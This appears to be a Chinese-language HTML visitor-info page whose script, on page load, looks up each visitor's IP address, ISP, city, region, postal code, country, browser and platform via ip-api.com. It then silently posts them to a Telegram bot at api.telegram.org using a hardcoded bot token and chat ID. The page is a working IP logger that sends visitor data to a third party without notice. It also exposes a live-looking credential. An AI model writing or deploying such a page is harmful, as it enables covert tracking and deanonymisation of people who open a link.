<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title>访问者信息</title>
	</head>
	<body>
		<div id="visitorInfo">
			<h2>访问者信息</h2>
			<p>IP地址: <span id="ipAddress"></span></p>
			<p>地理位置: <span id="location"></span></p>
			<p>ISP: <span id="isp"></span></p>
			<p>城市: <span id="city"></span></p>
			<p>地区: <span id="region"></span></p>
			<p>邮政编码: <span id="zip"></span></p>
			<p>国家: <span id="country"></span></p>
			<p>浏览器: <span id="browser"></span></p>
			<p>操作系统: <span id="os"></span></p>
		</div>

		<script>
			async function sendTelegramMessage(message) {
				try {
					const botToken = '5975737743:AAFxFhwL8_VIvZRkqXYeDVngTH3zXaqhy68'; // 替换为您的Telegram Bot的API令牌
					const chatId = '5957163999'; // 替换为您的Telegram聊天ID

					const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
					const requestOptions = {
						method: 'POST',
						headers: {
							'Content-Type': 'application/json',
						},
						body: JSON.stringify({
							chat_id: chatId,
							text: message,
						}),
					};

					const response = await fetch(apiUrl, requestOptions);
					const data = await response.json();

					// 输出Telegram API响应到控制台
					console.log('Telegram API 响应:', data);

					if (data.ok) {
						console.log('消息发送成功。');
					} else {
						console.error('消息发送失败:', data);
					}
				} catch (error) {
					console.error('消息发送失败:', error);
				}
			}

			async function fetchVisitorInfo() {
				try {
					const response = await fetch('http://ip-api.com/json', {
						referrerPolicy: 'no-referrer'
					});
					const data = await response.json();

					document.getElementById('ipAddress').textContent = data.query;
					document.getElementById('location').textContent = `${data.city}, ${data.regionName}, ${data.country}`;
					document.getElementById('isp').textContent = data.isp;
					document.getElementById('city').textContent = data.city;
					document.getElementById('region').textContent = data.regionName;
					document.getElementById('zip').textContent = data.zip;
					document.getElementById('country').textContent = data.country;
					document.getElementById('browser').textContent = navigator.userAgent;
					document.getElementById('os').textContent = navigator.platform;

					// 构建访问者信息消息
					const visitorInfoMessage = `
                    访问者信息:
                    IP地址: ${data.query}
                    地理位置: ${data.city}, ${data.regionName}, ${data.country}
                    ISP: ${data.isp}
                    城市: ${data.city}
                    地区: ${data.regionName}
                    邮政编码: ${data.zip}
                    国家: ${data.country}
                    浏览器: ${navigator.userAgent}
                    操作系统: ${navigator.platform}
                `;

					// 输出访问者信息到控制台
					console.log('访问者信息:', visitorInfoMessage);

					// 调用sendTelegramMessage发送消息
					await sendTelegramMessage(visitorInfoMessage);
				} catch (error) {
					console.error('获取访问者信息失败:', error);
				}
			}

			// 在页面加载时调用fetchVisitorInfo
			window.addEventListener('load', fetchVisitorInfo);
		</script>
	</body>
</html>
